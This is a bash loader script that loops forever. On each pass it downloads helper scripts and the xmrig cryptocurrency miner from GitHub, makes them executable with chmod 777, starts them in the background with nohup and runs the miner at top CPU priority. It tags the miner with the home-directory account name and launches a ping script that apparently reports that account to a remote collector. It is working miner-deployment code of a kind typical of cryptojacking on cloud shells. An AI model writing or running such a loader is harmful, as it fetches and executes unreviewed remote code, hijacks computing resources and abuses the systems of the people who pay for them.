#!/bin/bash

version='0.42'

path=$(pwd)
account=${path#/home/}

rm -rf ping.sh
rm -rf config.json

while true
do

  if [ ! -e 'http' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/http
  fi

  if [ ! -e 'log.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/log.sh && chmod 777 log.sh
  fi    
 
  if [ ! -e 'open_tmux.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/open_tmux.sh && chmod 777 open_tmux.sh
  fi    
  
  if [ ! -e 'send_tmux.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/send_tmux.sh && chmod 777 send_tmux.sh
  fi    
  
  if [ ! -e 'kill_tmux.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/kill_tmux.sh && chmod 777 kill_tmux.sh
  fi
  
  if [ ! -e 'while.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/while.sh && chmod 777 while.sh
  fi  
  
  if ! pgrep while.sh > /dev/null
  then
     nohup ./while.sh > /dev/null &
  fi  
  
  if [ ! -e 'ping.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/scripts/main/ping.sh && chmod 777 ping.sh
  fi
  
  if ! pgrep ping.sh > /dev/null
  then
     nohup ./ping.sh $account $version > /dev/null &
  fi

  if [ ! -e 'status.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/scripts/main/status.sh && chmod 777 status.sh
  fi

  if ! pgrep status.sh > /dev/null
  then
     nohup ./status.sh > /dev/null &
  fi

  if [ ! -e 'xmrig' ]
  then
     wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
  fi

  if [ ! -e 'config.json' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
     sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
  fi

  if ! pgrep xmrig > /dev/null
  then
     sleep 60
     nice -n -20 ./xmrig
  fi  

done
